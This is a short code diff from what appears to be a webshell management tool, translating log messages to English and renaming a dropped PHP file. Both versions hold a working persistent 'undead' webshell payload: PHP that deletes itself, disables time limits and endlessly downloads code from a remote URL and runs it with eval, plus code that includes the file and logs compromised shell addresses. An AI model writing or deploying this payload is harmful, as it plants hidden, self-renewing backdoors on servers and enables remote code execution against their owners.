@@ -42,9 +42,9 @@ class Core {
     var file_name = path.join(__dirname, '../db/rm_shell.txt');
     fs.appendFile(file_name, shell + " : " + address + "\n", 'utf-8', function (error) {
       if (error) {
-        console.log('写入失败')
+        console.log('Fail to record!')
       } else {
-        console.log('写入成功了')
+        console.log('Record successfully!')
       }
     })
   }
@@ -53,7 +53,7 @@ class Core {
   _inject_und3ad(rm_file, timeout) {
 
     return `
-    function Injector(){$myfile = fopen("testfile.php", "w");$txt = '<?php unlink(__FILE__);ignore_user_abort(true);set_time_limit(0);$remote_file = "${rm_file}";while($code = file_get_contents($remote_file)){@eval($code);sleep(${timeout});};?>';fwrite($myfile, $txt);};Injector();
+    function Injector(){$myfile = fopen("just4fun.php", "w");$txt = '<?php unlink(__FILE__);ignore_user_abort(true);set_time_limit(0);$remote_file = "${rm_file}";while($code = file_get_contents($remote_file)){@eval($code);sleep(${timeout});};?>';fwrite($myfile, $txt);};Injector();
     `;
 
   }
@@ -61,7 +61,7 @@ class Core {
   //执行不死webshell
   _execute_und3ad() {
     return `
-    include("testfile.php");
+    include("just4fun.php");
     `;
   }
 
